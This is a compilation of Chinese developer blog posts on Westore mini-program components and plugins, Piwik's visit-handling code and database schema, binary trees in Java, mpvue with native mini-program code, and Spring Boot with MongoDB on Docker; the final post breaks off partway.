这里需要特别强调，虽然 this.update 可以兼容小程序的 this.setData 的方式传参，但是更加智能，this.update 会先 Diff 然后 setData。原理:

纯组件
常见纯组件由很多，如 tip、alert、dialog、pager、日历等，与业务数据无直接耦合关系。
组件的显示状态由传入的 props 决定，与外界的通讯通过内部 triggerEvent 暴露的回调。
triggerEvent 的回调函数可以改变全局状态，实现单向数据流同步所有状态给其他兄弟、堂兄、姑姑等组件或者其他页面。
Westore里可以使用 create({ pure: true }) 创建纯组件（当然也可以直接使用 Component），比如 ：

import create from '../../utils/create'

create({
  pure : true,
  
  properties: {
    text: {
      type: String,
      value: '',
      observer(newValue, oldValue) { }
    }
  },

  data: {
    privateData: 'privateData'
  },

  ready: function () {
    console.log(this.properties.text)
  },

  methods: {
    onTap: function(){
      this.store.data.privateData = '成功修改 privateData'
      this.update()
      this.triggerEvent('random', {rd:'成功发起单向数据流' + Math.floor( Math.random()*1000)})
    }
  }
})
需要注意的是，加上 pure : true 之后就是纯组件，组件的 data 不会被合并到全局的 store.data 上。
组件区分业务组件和纯组件，他们的区别如下：

业务组件与业务数据紧耦合，换一个项目可能该组件就用不上，除非非常类似的项目
业务组件通过 store 获得所需参数，通过更改 store 与外界通讯
业务组件也可以通过 props 获得所需参数，通过 triggerEvent 与外界通讯
纯组件与业务数据无关，可移植和复用
纯组件只能通过 props 获得所需参数，通过 triggerEvent 与外界通讯

大型项目一定会包含纯组件、业务组件。通过纯组件，可以很好理解单向数据流。
小程序插件

小程序插件是对一组 JS 接口、自定义组件或页面的封装，用于嵌入到小程序中使用。插件不能独立运行，必须嵌入在其他小程序中才能被用户使用；而第三方小程序在使用插件时，也无法看到插件的代码。因此，插件适合用来封装自己的功能或服务，提供给第三方小程序进行展示和使用。
插件开发者可以像开发小程序一样编写一个插件并上传代码，在插件发布之后，其他小程序方可调用。小程序平台会托管插件代码，其他小程序调用时，上传的插件代码会随小程序一起下载运行。

插件开发者文档
插件使用者文档

插件开发
Westore 提供的目录如下:
|--components
|--westore  
|--plugin.json  
|--store.js
创建插件:
import create from '../../westore/create-plugin'
import store from '../../store'

//最外层容器节点需要传入 store，其他组件不传 store
create(store, {
  properties:{
    authKey:{
      type: String,
      value: ''
    }
  },
  data: { list: [] },
  attached: function () {
    // 可以得到插件上声明传递过来的属性值
    console.log(this.properties.authKey)
    // 监听所有变化
    this.store.onChange = (detail) => {
      this.triggerEvent('listChange', detail)
    }
    // 可以在这里发起网络请求获取插件的数据
    this.store.data.list = [{
      name: '电视',
      price: 1000
    }, {
      name: '电脑',
      price: 4000
    }, {
      name: '手机',
      price: 3000
    }]

    this.update()

    //同样也直接和兼容 setData 语法
    this.update(
        { 'list[2].price': 100000 }
    )
  }
})
在你的小程序中使用组件：
<list auth-key="{{authKey}}" bind:listChange="onListChange" />
这里来梳理下小程序自定义组件插件怎么和使用它的小程序通讯:

通过 properties 传入更新插件，通过 properties 的 observer 来更新插件
通过 store.onChange 收集 data 的所有变更
通过 triggerEvent 来抛事件给使用插件外部的小程序

这么方便简洁还不赶紧试试 Westore插件开发模板 ！
特别强调
插件内所有组件公用的 store 和插件外小程序的 store 是相互隔离的。
原理
页面生命周期函数



名称
描述




onLoad
监听页面加载


onShow
监听页面显示


onReady
监听页面初次渲染完成


onHide
监听页面隐藏


onUnload
监听页面卸载



组件生命周期函数



名称
描述




created
在组件实例进入页面节点树时执行，注意此时不能调用 setData


attached
在组件实例进入页面节点树时执行


ready
在组件布局完成后执行，此时可以获取节点信息（使用 SelectorQuery ）


moved
在组件实例被移动到节点树另一个位置时执行


detached
在组件实例被从页面节点树移除时执行



由于开发插件时候的组件没有 this.page，所以 store 是从根组件注入，而且可以在 attached 提前注入:
export default function create(store, option) {
    let opt = store
    if (option) {
        opt = option
        originData = JSON.parse(JSON.stringify(store.data))
        globalStore = store
        globalStore.instances = []
        create.store = globalStore
    }

    const attached = opt.attached
    opt.attached = function () {
        this.store = globalStore
        this.store.data = Object.assign(globalStore.data, opt.data)
        this.setData.call(this, this.store.data)
        globalStore.instances.push(this)
        rewriteUpdate(this)
        attached && attached.call(this)
    }
    Component(opt)
}
总结

组件 - 对 WXML、WXSS 和 JS 的封装，与业务耦合，可复用，难移植
纯组件 - 对 WXML、WXSS 和 JS 的封装，与业务解耦，可复用，易移植
插件 - 小程序插件是对一组 JS 接口、自定义组件或页面的封装，与业务耦合，可复用

Star & Fork 小程序解决方案
https://github.com/dntzhang/westore
License
MIT @dntzhang

********************************************************************************************************************************************************************************************************
开源网站流量统计系统Piwik源码分析——后台处理（二）
　　在第一篇文章中，重点介绍了脚本需要搜集的数据，而本篇主要介绍的是服务器端如何处理客户端发送过来的请求和参数。
一、设备信息检测
　　通过分析User-Agent请求首部（如下图红线框出的部分），可以得到相关的设备信息。
 
　　Piwik系统专门有一套代码用来分析代理信息，还独立了出来，叫做DeviceDetector。它有一个专门的demo页面，可以展示其功能，点进去后可以看到下图中的内容。

　　它能检测出浏览器名称、浏览器的渲染引擎、浏览器的版本、设备品牌（例如HTC、Apple、HP等）、设备型号（例如iPad、Nexus 5、Galaxy S5等）、设备类别（例如desktop、smartphone、tablet等），这6类数据中的可供选择的关键字，可以参考“List of segments”或插件的“readme”。顺便说一下，Piwik还能获取到访客的定位信息，在“List of segments”中，列举出了城市、经纬度等信息，其原理暂时还没研究。
　　Piwik为大部分设备信息的关键字配备了一个icon图标，所有的icon图标被放置在“plugins\Morpheus\icons”中，包括浏览器、设备、国旗、操作系统等，下图截取的是浏览器中的部分图标。

二、IP地址
　　在Piwik系统的后台设置中，可以选择IP地址的获取方式（如下图所示）。在官方博客的一篇《Geo Locate your visitors》博文中提到，3.5版本后可以在系统中嵌入MaxMind公司提供的IP地理定位服务（GeoIP2）。

　　下面是一张看官方的产品介绍表，从描述中可看出这是一项非常厉害的服务。不过需要注意的是，这是一项付费服务。

三、日志数据和归档数据
　　在官方发布的说明文档《How Matomo (formerly Piwik) Works》中提到，在Piwik中有两种数据类型：日志数据和归档数据。日志数据（Log Data）是一种原始分析数据，从客户端发送过来的参数就是日志数据，刚刚设备检测到的信息也是日志数据，还有其它的一些日志数据的来源，暂时还没细究。由于日志数据非常巨大，因此不能直接生成最终用户可看的报告，得使用归档数据来生成报告。归档数据（Archive Data）是以日志数据为基础而构建出来的，它是一种被缓存并且可用于生成报告的聚合分析数据。
　　日志数据会通过“core\Piwik\Tracker\Visit.php”中的方法保存到数据库中，其中核心的方法如下所示，注释中也强调了该方法中的内容是处理请求的主要逻辑。该方法涉及到了很多对象，以及对象的方法，错综复杂，我自己也没有研究透，只是利用PHPStorm编辑器自动索引，查找出了一些关联，具体细节还有待考证。

/**
 *  Main algorithm to handle the visit.
 *
 *  Once we have the visitor information, we have to determine if the visit is a new or a known visit.
 *
 * 1) When the last action was done more than 30min ago,
 *      or if the visitor is new, then this is a new visit.
 *
 * 2) If the last action is less than 30min ago, then the same visit is going on.
 *    Because the visit goes on, we can get the time spent during the last action.
 *
 * NB:
 *  - In the case of a new visit, then the time spent
 *    during the last action of the previous visit is unknown.
 *
 *    - In the case of a new visit but with a known visitor,
 *    we can set the 'returning visitor' flag.
 *
 * In all the cases we set a cookie to the visitor with the new information.
 */
public function handle() {
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::manipulateRequest()...");
        $processor->manipulateRequest($this->request);
    }
    $this->visitProperties = new VisitProperties();
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::processRequestParams()...");
        $abort = $processor->processRequestParams($this->visitProperties, $this->request);
        if ($abort) {
            Common::printDebug("-> aborting due to processRequestParams method");
            return;
        }
    }
    $isNewVisit = $this->request->getMetadata('CoreHome', 'isNewVisit');
    if (!$isNewVisit) {
        $isNewVisit = $this->triggerPredicateHookOnDimensions($this->getAllVisitDimensions() , 'shouldForceNewVisit');
        $this->request->setMetadata('CoreHome', 'isNewVisit', $isNewVisit);
    }
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::afterRequestProcessed()...");
        $abort = $processor->afterRequestProcessed($this->visitProperties, $this->request);
        if ($abort) {
            Common::printDebug("-> aborting due to afterRequestProcessed method");
            return;
        }
    }
    $isNewVisit = $this->request->getMetadata('CoreHome', 'isNewVisit');
    // Known visit when:
    // ( - the visitor has the Piwik cookie with the idcookie ID used by Piwik to match the visitor
    //   OR
    //   - the visitor doesn't have the Piwik cookie but could be match using heuristics @see recognizeTheVisitor()
    // )
    // AND
    // - the last page view for this visitor was less than 30 minutes ago @see isLastActionInTheSameVisit()
    if (!$isNewVisit) {
        try {
            $this->handleExistingVisit($this->request->getMetadata('Goals', 'visitIsConverted'));
        }
        catch(VisitorNotFoundInDb $e) {
            $this->request->setMetadata('CoreHome', 'visitorNotFoundInDb', true); // TODO: perhaps we should just abort here?
            
        }
    }
    // New visit when:
    // - the visitor has the Piwik cookie but the last action was performed more than 30 min ago @see isLastActionInTheSameVisit()
    // - the visitor doesn't have the Piwik cookie, and couldn't be matched in @see recognizeTheVisitor()
    // - the visitor does have the Piwik cookie but the idcookie and idvisit found in the cookie didn't match to any existing visit in the DB
    if ($isNewVisit) {
        $this->handleNewVisit($this->request->getMetadata('Goals', 'visitIsConverted'));
    }
    // update the cookie with the new visit information
    $this->request->setThirdPartyCookie($this->request->getVisitorIdForThirdPartyCookie());
    foreach ($this->requestProcessors as $processor) {
        Common::printDebug("Executing " . get_class($processor) . "::recordLogs()...");
        $processor->recordLogs($this->visitProperties, $this->request);
    }
    $this->markArchivedReportsAsInvalidIfArchiveAlreadyFinished();
}

 　　最后了解一下Piwik的数据库设计，此处只分析与日志数据和归档数据有关的数据表。官方的说明文档曾介绍，日志数据有5张相关的数据表，我对于表的内在含义还比较模糊，因此下面所列的描述还不是很清晰。
（1）log_visit：每次访问都会生成一条访问者记录，表中的字段可参考“Visits”。
（2）log_action：网站上的访问和操作类型（例如特定URL、网页标题），可分析出访问者感兴趣的页面，表中的字段可参考“Action Types”。
（3）log_link_visit_action：访问者在浏览期间执行的操作，表中的字段可参考“Visit Actions”。
（4）log_conversion：访问期间发生的转化（与目标相符的操作），表中的字段可参考“Conversions”。
（5）log_conversion_item：与电子商务相关的信息，表中的字段可参考“Ecommerce items”。
　　归档数据的表有两种前缀，分别是“archive_numeric_”和“archive_blob_”，表的字段可参考“Archive data”。通过对字段的观察可知，两种最大的不同就是value字段的数据类型。archive_numeric_* 表中的value能储存数值（数据类型是Double），而archive_blob_* 表中的value能储存出数字以外的其他任何数据（数据类型是Blob）。
　　两种表都是动态生成的，因此前缀的后面都用“*”表示。生成规则可按年、月、周、天或自定义日期范围，不设置的话，默认是按月计算，例如archive_numeric_2018_09、archive_blob_2018_09。
 
参考资料：
开源网站分析软件Piwik的数据库表结构
Piwik运转原理
How Matomo (formerly Piwik) Works
Database schema
数据分析技术白皮书
What data does Matomo track?
Segmentation in the API
device-detector
Device Detector demo page
Geo Locate your visitors
 
********************************************************************************************************************************************************************************************************
Android版数据结构与算法(六):树与二叉树
版权声明：本文出自汪磊的博客，未经作者允许禁止转载。
 之前的篇章主要讲解了数据结构中的线性结构，所谓线性结构就是数据与数据之间是一对一的关系，接下来我们就要进入非线性结构的世界了，主要是树与图，好了接下来我们将会了解到树以及二叉树，二叉平衡树，赫夫曼树等原理以及java代码的实现，先从最基础的开始学习吧。
一、树
树的定义：
树是n(n>=0)个结点的有限集合。
当n=0时，集合为空,称为空树。
在任意一颗非空树中，有且仅有一个特定的结点称为根。
当n>1时,除根结点以外的其余结点可分成m(m>=0)个不相交的有限结点集合T1,T2….Tm.其中每个集合本身也是一棵树,称为根的子树。
如下图就是一棵树:

可以看到，树这种数据结构数据之间是一对一或者一对多关系，不再是一对一的关系
在上图中节点A叫做整棵树的根节点，一棵树中只有一个根节点。
根节点可以生出多个孩子节点，孩子节点又可以生出多个孩子节点。比如A的孩子节点为B和C，D的孩子节点为G，H，I。
每个孩子节点只有一个父节点，比如D的父节点为B，E的父节点为C。
好了，关于树的定义介绍到这，很简单。
二、树的相关术语

 
节点的度
节点含有的子树个数，叫做节点的度。度为0的节点成为叶子结点或终端结点。比如上图中D的度为3，E的度为1.
G,H,I,J的度为0，叫做叶子结点。
树的度
 一棵树中 最大节点的度树的度。比如上图中树的度为3
结点的层次
从根结点算起，为第一层，其余依次类推如上图。B,C的层次为2，G,H的层次为4。
树中节点的最大层次称为树的高度或深度。上图中树的高度或深度为4
三、树的存储结构
简单的顺序存储不能满足树的实现，需要结合顺序存储和链式存储来解决。
树的存储方式主要有三种：
双亲表示法：每个节点不仅保存自己数据还附带一个指示器指示其父节点的角标，这种方式可以用数组来存储。
如图：

这种存储方式特点是：查找一个节点的孩子节点会很麻烦但是查找其父节点很简单。
孩子表示法：每个节点不仅保存自己数据信息还附带指示其孩子的指示器，这种方式用链表来存储比较合适。
如图：

这种存储方式特点是：查找一个节点的父亲节点会很麻烦但是查找其孩子节点很简单。
理想表示法：数组+链表的存储方式，把每个结点的孩子结点排列起来，以单链表方式连接起来，则n个孩子有n个孩子链表，如果是叶子结点则此链表为空，然后n个头指针又组成线性表，采用顺序存储方式，存储在一个一维数组中。
如图：

这种方式查找父节点与孩子结点都比较简便。
以上主要介绍了树的一些概念以及存储方式介绍，实际我们用的更多的是二叉树，接下来我们看下二叉树。
四、二叉树的概念
二叉树定义：二叉树是n（n>=0）个结点的有限集合，该集合或者为空，或者由一个根结点和两课互不相交的，分别称为根结点左子树和右子树的二叉树组成。
用人话说，二叉树是每个节点至多有两个子树的树。
如图就是一颗二叉树：
 
 
五、特殊二叉树
斜树：所有结点只有左子树的二叉树叫做左斜树，所有结点只有右子树的二叉树叫做右斜树。
如图：

满二叉树：在一棵二叉树中，所有分支结点都有左子树与右子树，并且所有叶子结点都在同一层则为满二叉树。
如图：

完全二叉树：所有叶子节点都出现在 k 或者 k-1 层，而且从 1 到 k-1 层必须达到最大节点数，第 k 层可是不是慢的，但是第 k 层的所有节点必须集中在最左边。
如图：

 
 六、二叉树的遍历
二叉树的遍历主要有三种：先序遍历，中序遍历，后续遍历，接下来我们挨个了解一下。
先序遍历：先访问根结点，再先序遍历左子树，再先序遍历右子树。
如图所示：
 

先序遍历结果为：ABDGHCEIF
中序遍历：先中序遍历左子树，再访问根结点，再中序遍历右子树。
如图：

中序遍历结果为：GDHBAEICF
后序遍历：先后序遍历左子树，再后序遍历右子树，再访问根结点。
如图：

后序遍历结果：GHDBIEFCA
七、java实现二叉树
先来看看每个结点类：

 1     public class TreeNode{
 2         private String data;//自己结点数据
 3         private TreeNode leftChild;//左孩子
 4         private TreeNode rightChild;//右孩子
 5         
 6         public String getData() {
 7             return data;
 8         }
 9         
10         public void setData(String data) {
11             this.data = data;
12         }
13         
14         public TreeNode(String data){
15             this.data = data;
16             this.leftChild = null;
17             this.rightChild = null;
18         }
19     }

很简单，每个结点信息包含自己结点数据以及指向左右孩子的指针（为了方便，我这里就叫指针了）。
二叉树的创建
我们创建如下二叉树：

代码实现：

public class BinaryTree {
    private TreeNode  root = null;

    public TreeNode getRoot() {
        return root;
    }

    public BinaryTree(){
        root = new TreeNode("A");
    }
    
    /**
     * 构建二叉树
     *          A
     *     B        C
     *  D    E    F   G
     */
    public void createBinaryTree(){
        TreeNode nodeB = new TreeNode("B");
        TreeNode nodeC = new TreeNode("C");
        TreeNode nodeD = new TreeNode("D");
        TreeNode nodeE = new TreeNode("E");
        TreeNode nodeF = new TreeNode("F");
        TreeNode nodeG = new TreeNode("G");
        root.leftChild = nodeB;
        root.rightChild = nodeC;
        nodeB.leftChild = nodeD;
        nodeB.rightChild = nodeE;
        nodeC.leftChild = nodeF;
        nodeC.rightChild = nodeG;
    }
        。。。。。。。
}

创建BinaryTree的时候就已经创建根结点A，createBinaryTree()方法中创建其余结点并且建立相应关系。
获得二叉树的高度
树中节点的最大层次称为树的高度，因此获得树的高度需要递归获取所有节点的高度，取最大值。

     /**
     * 求二叉树的高度
     * @author Administrator
     *
     */
    public int getHeight(){
        return getHeight(root);
    }
    
    private int getHeight(TreeNode node) {
        if(node == null){
            return 0;
        }else{
            int i = getHeight(node.leftChild);
            int j = getHeight(node.rightChild);
            return (i<j)?j+1:i+1;
        }
    }        

获取二叉树的结点数
获取二叉树结点总数，需要遍历左右子树然后相加

 1     /**
 2      * 获取二叉树的结点数
 3      * @author Administrator
 4      *
 5      */
 6     public int getSize(){
 7         return getSize(root);
 8     }
 9     
10     private int getSize(TreeNode node) {
11         if(node == null){
12             return 0;
13         }else{
14             return 1+getSize(node.leftChild)+getSize(node.rightChild);
15         }
16     }

二叉树的遍历
二叉树遍历分为前序遍历，中序遍历，后续遍历，主要也是递归思想，下面直接给出代码

    /**
     * 前序遍历——迭代
     * @author Administrator
     *
     */
    public void preOrder(TreeNode node){
        if(node == null){
            return;
        }else{
            System.out.println("preOrder data:"+node.getData());
            preOrder(node.leftChild);
            preOrder(node.rightChild);
        }
    }

    /**
     * 中序遍历——迭代
     * @author Administrator
     *
     */
    public void midOrder(TreeNode node){
        if(node == null){
            return;
        }else{
            midOrder(node.leftChild);
            System.out.println("midOrder data:"+node.getData());
            midOrder(node.rightChild);
        }
    }
    
    /**
     * 后序遍历——迭代
     * @author Administrator
     *
     */
    public void postOrder(TreeNode node){
        if(node == null){
            return;
        }else{
            postOrder(node.leftChild);
            postOrder(node.rightChild);
            System.out.println("postOrder data:"+node.getData());
        }
    }

获取某一结点的父结点
获取结点的父节点也是递归思想，先判断当前节点左右孩子是否与给定节点信息相等，相等则当前结点即为给定结点的父节点，否则继续递归左子树，右子树。

 1 /**
 2      * 查找某一结点的父结点
 3      * @param data
 4      * @return
 5      */
 6     public TreeNode getParent(String data){
 7         //封装为内部结点信息
 8         TreeNode node = new TreeNode(data);
 9         //
10         if (root == null || node.data.equals(root.data)){
11             //根结点为null或者要查找的结点就为根结点，则直接返回null，根结点没有父结点
12             return null;
13         }
14         return getParent(root, node);//递归查找
15     }
16 
17     public TreeNode getParent(TreeNode subTree, TreeNode node) {
18 
19         if (null == subTree){//子树为null，直接返回null
20             return null;
21         }
22         //判断左或者右结点是否与给定结点相等，相等则此结点即为给定结点的父结点
23         if(subTree.leftChild.data.equals(node.data) || subTree.rightChild.data.equals(node.data)){
24             return subTree;
25         }
26         //以上都不符合，则递归查找
27         if (getParent(subTree.leftChild,node)!=null){//先查找左子树，左子树找不到查询右子树
28             return getParent(subTree.leftChild,node);
29         }else {
30             return getParent(subTree.rightChild,node);
31         }
32     }

八、总结
以上总结了树与二叉树的一些概念，重点就是二叉树的遍历以及java代码实现，比较简单，没什么多余解释，下一篇了解一下赫夫曼树以及二叉排序树。
********************************************************************************************************************************************************************************************************
小程序开发总结一：mpvue框架及与小程序原生的混搭开发
mpvue-native:小程序原生和mpvue代码共存
问题描述
mpvue和wepy等框架是在小程序出来一段时间之后才开始有的，所以会出现的问题有：需要兼容已有的老项目，有些场景对小程序的兼容要求特别高的时候需要用原生的方式开发
解决思路

mpvue的入口文件导入旧版路由配置文件
公共样式 字体图标迁移 app.wxss -> app.vue中less（mpvue的公共样式）
旧项目导入 旧项目(native)拷贝到dist打包的根目录


这个要注意的就是拷贝的旧项目不能覆盖mpvue打包文件，只要避免文件夹名字冲突即可

mpvue-native使用
yarn dev xiejun // 本地启动
yarn build xiejun // 打包
开发者工具指向目录
/dist/xiejun

github地址： https://github.com/xiejun-net/mpvue-native

mpvue-native目录结构
|----build
|----config
|----dist 打包后项目目录
    |----<projetc1>
    |----<projetc2>
|----src 源码
    |----assets 通用资源目录
    |----components 组件
    |----pages 公共页面页面
    |----utils 常用库
    |----<project> 对应单个项目的文件
        |----home mpvue页面
            |----assets
            |----App.vue
            |----main.js
        |----native 原生目录
            |----test 小程序原生页面
                |---web.js
                |---web.wxml
                |---web.wxss
                |---web.json
        |----app.json 路径、分包
        |----App.vue
        |----main.js mpvue项目入口文件
|----static 静态文件
|----package.json
拷贝旧项目到根目录下
 new CopyWebpackPlugin([
    {
    from: path.resolve(__dirname, `../src/${config.projectName}/native`),
    to: "",
    ignore: [".*"]
    }
]),
入口及页面
const appEntry = { app: resolve(`./src/${config.projectName}/main.js`) } // 各个项目入口文件
const pagesEntry = getEntry(resolve('./src'), 'pages/**/main.js') // 各个项目的公共页面
const projectEntry = getEntry(resolve('./src'), `${config.projectName}/**/main.js`) // 某个项目的mpvue页面
const entry = Object.assign({}, appEntry, pagesEntry, projectEntry)
多项目共用页面
参考web中一个项目可以有多个spa，我们也可以一个项目里包含多个小程序，多个小程序之间可以共用组件和公用页面，在某些场景下可以节省很多开发时间和维护时间。
打包的时候根据项目入口打包 yarn dev <project>
分包
旧项目作为主包
其他根据文件夹 pages xiejun 分包作为两个包加载
具体根据实际情况来分
// app.json文件配置 pages 为主包
  "pages": [
    "test/web"
  ],
  "subPackages": [
    {
      "root": "pages",
      "pages": [
        "about/main"
      ]
    },
    { 
      "root": "xiejun", 
      "pages": [
          "home/main"
        ]
    }
  ],
其他有关小程序开发坑和技巧
字体图标的使用

网页我们直接引用css就好//at.alicdn.com/t/font_263892_1oe6c1cnjiofxbt9.css

小程序只需要新建一个css文件把在线的css代码拷贝过来放置全局即可

关于小程序和mpvue生命周期
点此查看mpvue的生命周期
从官方文档上生命周期的图示上可以看到created是在onLaunch之前，也就是说每个页面的created 出发时机都是整个应用开启的时机，所以一般页面里面都是用mouted 来请求数据的。
如何判断小程序当前环境
问题描述
发布小程序的时候经常担心配置错误的服务器环境
而小程序官方没有提供任何关于判断小程序是体验版还是开发版本的api
解决方案
熟悉小程序开发的不难发现小程序https请求的时候的referer是有规律的：https://servicewechat.com/${appId}/${env}/page-frame.html
即链接中包含了当前小程序的appId

开发工具中 appId紧接着的dev是 devtools
设备上 开发或者体验版 appId紧接着的env是 0
设备上 正式发布版本 appId紧接着的env是数字 如： 20 发现是小程序的发布版本次数，20代表发布了20次

由此我们可以通过env 这个参数来判断当前是什么环境，
前端是无法获取到referer的，所以需要后端提供一个接口,返回得到referer
代码
// https://servicewechat.com/${appId}/${env}/page-frame.html
// 默认是正式环境，微信官方并没有说referer规则一定如此，保险起见 try catch
async getEnv() {
    try {
        let referer = await userService.getReferer() // 接口获取referer
        let flag = referer.match(/wx2312312312\/(\S*)\/page-frame/)[1]
        if (flag === 'devtools') { // 开发工具
            // setHostDev()
        } else if (parseInt(flag) > 0) { // 正式版本
            // setHostPro()
        } else { // 开发版本和体验版本
            // setHostTest()
        }
    } catch (e) {
        console.log(e)
    }
}
Promise
官方文档上说Promise 都支持
实际测试发现其实在ios8上是有问题的
所以request.js
import Es6Promise from 'es6-promise'
Es6Promise.polyfill()
wx.navigateto返回层级问题
官方文档是说目前可以返回10层
实际情况是在某些机型上只能返回5层 和原来一样
所以最好使用wx.navigateto跳转不超过5层
压缩兼容问题
在微信开发者工具上传代码的时候
务必把项目ES6转ES5否则会出现兼问题

个人公众号:程序员很忙（xiejun_asp）



********************************************************************************************************************************************************************************************************
Spring Boot （八）MyBatis + Docker + MongoDB 4.x
一、MongoDB简介
1.1 MongoDB介绍
MongoDB是一个强大、灵活，且易于扩展的通用型数据库。MongoDB是C++编写的文档型数据库，有着丰富的关系型数据库的功能，并在4.0之后添加了事务支持。
随着存储数据量不断的增加，开发者面临一个困难：如何扩展数据库？而扩展数据库分为横向扩展和纵向扩展，纵向扩展就是使用计算能力更强大的机器，它的缺点就是：机器性能的提升有物理极限的制约，而且大型机通常都是非常昂贵的，而MongoDB的设计采用的是横向扩展的模式，面向文档的数据模型使它很容易的在多台服务器上进行数据分割。MongoDB能自动处理夸集群的数据和负载，自动重新分配文档，这样开发者就能集中精力编写应用程序，而不需要考虑如果扩展的问题。

1.2 MongoDB安装
MongoDB的安装简单来说分为两种：

官网下载对应物理机的安装包，直接安装
使用Docker镜像，安装到Docker上

推荐使用第二种，直接使用MongoDB镜像安装到Docker上，这样带来的好处是：

安装简单、方便，且快速
更容易进行数据迁移，使用Docker可以很容易的导入和导出整个MongoDB到任何地方

所以本文将重点介绍MongoDB在Docker上的安装和使用。
如果想要直接在物理机安装Docker，可以查看我之前的一篇文章《MongoDB基础介绍安装与使用》：https://www.cnblogs.com/vipstone/p/8494347.html
1.3 Docker上安装MongoDB
在Docker上安装软件一般需要两步：

pull（下载）对应的镜像（相对于下载软件）
装载镜像到容器（相对于安装软件）

1.3.1 下载镜像
下载镜像，需要到镜像市场：https://hub.docker.com/，如要要搜索的软件“mongo”，选择官方镜像“Official”，点击详情，获取相应的下载方法，我们得到下载MongoDB的命令如下：

docker pull mongo:latest

1.3.2 装载镜像到容器
使用命令：

docker run --name mongodb1 -p 27018:27017 -d mongo:latest


--name 指定容器名称
-p 27018:27017 映射本地端口27018到容器端口27017
-d 后台运行
mongo:latest 镜像名称和标签

使用“docker images”查看镜像名称和标签，如下图：

容器装载成功之后，就可以使用Robo 3T客户端进行连接了，是不需要输入用户名和密码的，如下图：

表示已经连接成功了。
Robo 3T为免费的连接MongoDB的数据库工具，可以去官网下载：https://robomongo.org/download
1.3.3 开启身份认证
如果是生成环境，没有用户名和密码的MongoDB是非常不安全的，因此我们需要开启身份认证。
Setp1：装载容器
我们还是用之前下载的镜像，重新装载一个容器实例，命令如下：

docker run --name mongodb2 -p 27019:27017 -d mongo:latest --auth

其中“--auth”就是开启身份认证。
装载完身份认证成功容器之后，我们需要进入容器内部，给MongoDB设置用户名和密码。
Setp2：进入容器内部

docker exec -it  bash

Setp3：进入mongo命令行模式

mongo admin

Setp4：创建用户

db.createUser({ user: 'admin', pwd: 'admin', roles: [ { role: "userAdminAnyDatabase", db: "admin" } ] });

创建的用户名为“admin”密码为“admin”，指定的数据库为“admin”。
这个时候，我们使用Robo 3T 输入相应的信息进行连接，如下图：

表示已经连接成功了。
1.3.4 创建数据库设置用户
上面我们用“admin”账户使用了系统数据库“admin”，通常在生成环境我们不会直接使用系统的数据库，这个时候我们需要自己创建自己的数据库分配相应的用户。
Setp1：首先需要进入容器

docker exec -it  bash

Setp2：创建数据库

use testdb

如果没有testdb就会自动创建数据库。
Setp3：创建用户分配数据库

db.createUser({ user: 'admin', pwd: 'admin', roles: [ { role: "readWrite", db: "testdb" } ] });

其中 role: "readWrite" 表式给用户赋值操作和读取的权限，当然增加索引、删除表什么的也是完全没有问题的。
到目前为止我们就可以使用admin/admin操作testdb数据库了。
1.3.5 其他Docker命令
删除容器：docker container rm 
停止容器：docker stop 
启动容器：docker start 
查看运行是容器：docker ps
查询所有的容器：docker ps -a
二、MyBatis集成MongoDB
Spring Boot项目集成MyBatis前两篇文章已经做了详细的介绍，这里就不做过多的介绍，本文重点来介绍MongoDB的集成。
Setp1：添加依赖
在pom.xml添加如下依赖：
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-mongodb</artifactId>
</dependency>
Setp2：配置MongoDB连接
在application.properties添加如下配置：
spring.data.mongodb.uri=mongodb://username:pwd@172.16.10.79:27019/testdb
Setp3：创建实体类
import java.io.Serializable;

public class User implements Serializable {
    private Long id;
    private String name;
    private int age;
    private String pwd;
    //...略set、get
}

Setp4：创建Dao类
import com.hello.springboot.entity.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoTemplate;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.data.mongodb.core.query.Update;
import org.springframework.stereotype.Component;
import java.util.List;

@Component
public class UserDao {
    @Autowired
    private MongoTemplate mongoTemplate;
    /**
     * 添加用户
     * @param user User Object
     */
    public void insert(User user) {
        mongoTemplate.save(user);
    }

    /**
     * 查询所有用户
     * @return
     */
    public List<User> findAll() {
        return mongoTemplate.findAll(User.class);
    }

    /**
     * 根据id 查询
     * @param id
     * @return
     */
    public User findById(Long id) {
        Query query = new Query(Criteria.where("id").is(id));
        User user = mongoTemplate.findOne(query, User.class);
        return user;
    }

    /**
     * 更新
     * @param user
     */
    public void updateUser(User user) {
        Query query = new Query(Criteria.where("id").is(user.getId()));
        Update update = new Update().set("name", user.getName()).set("pwd", user.getPwd());
        mongoTemplate.updateFirst(query, update, User.class);
    }

    /**
     * 删除对象
     * @param id
     */
    public void deleteUserById(Long id) {
        Query query = new Query(Criteria.where("id").is(id));
        mongoTemplate.remove(query, User.class);
    }

}

Setp4：创建Controller
import com.hello.springboot.dao.IndexBuilderDao;
import com.hello.springboot.dao.UserDao;
import com.hello.springboot.entity.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

@RestController
@RequestMapping("/")
public class UserController {
    @Autowired
    private UserDao userDao;

    @RequestMapping("/")
    public ModelAndView index() {
        User user = new User();
        user.setId(new Long(1));
        user.setAge(18);
        user.setName("Adam");
        user.setPwd("123456");
        userDao.insert(user);

        ModelAndView modelAndView = new ModelAndView("/index");
        modelAndView.addObject("count", userDao.findAll().size());
        return modelAndView;
    }
}

Setp5：创建页面代码
<html>
<head>
    <title>王磊的博客</title>
</head>
<body>
Hello ${count}
</body>
</html>
到此为止已经完成了MongoDB的集成，启动项目，输入“http://localhost:8080/”去数据库查看插入的数据吧。
正常插入数据库如下图：

三、MongoDB主键自增
细心的用户可能会发现，虽然MongoDB已经集成完了，但插入数据库的时候user的id是手动set的值，接下来我们来看怎么实现MongoDB中的id自增。
3.1 实现思路
MongoDB 实现id自增和Spring Boot JPA类似，是在数据库创建一张表，来记录表的“自增id”，只需要保证每次都增加的id和返回的id的原子性，就能保证id实现“自增”的功能。
3.2 实现方案
有了思路之后，接下来我们来看具体的实现方案。
3.2.1 创建实体类
import org.springframework.data.annotation.Id;
